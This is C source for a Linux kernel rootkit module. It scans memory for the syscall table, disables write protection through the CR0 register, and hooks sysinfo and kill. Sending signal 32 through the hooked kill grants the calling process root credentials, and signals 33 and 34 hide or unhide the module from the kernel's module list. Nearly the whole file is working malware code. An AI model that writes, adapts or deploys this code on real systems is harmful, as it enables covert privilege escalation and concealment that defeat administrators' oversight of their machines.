#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#include "modify_syscalls.h"

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

#define SIG_GIVE_ROOT 32
#define SIG_HIDE 33
#define SIG_UNHIDE 34

asmlinkage int (*original_sysinfo)(struct sysinfo *);
asmlinkage int (*original_kill)(pid_t, int);

struct list_head *module_list;


void update_sys_calls(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = hacked_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = hacked_kill;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    ENABLE_W_PROTECTED_MEMORY
}

void revert_to_original(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = original_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = original_kill;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    ENABLE_W_PROTECTED_MEMORY
}

asmlinkage int hacked_sysinfo(struct sysinfo *info)
{
    original_sysinfo(info);
    info->uptime = 0;
    pr_info("System information modified!\n");
    return 0;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
    struct task_struct *task;

    switch(sig) {
        case SIG_GIVE_ROOT:
            give_root();
            pr_info("Root priviledge given!\n");
            break;
        case SIG_HIDE:
            pr_info("Hiding the module!\n");
            hide();
            break;
        case SIG_UNHIDE:
            pr_info("Unhiding the module!\n");
            unhide();
            break;
        default:
            return original_kill(pid, sig);
    }
    return 0;
}

void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
 
    commit_creds(newcreds);
}

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}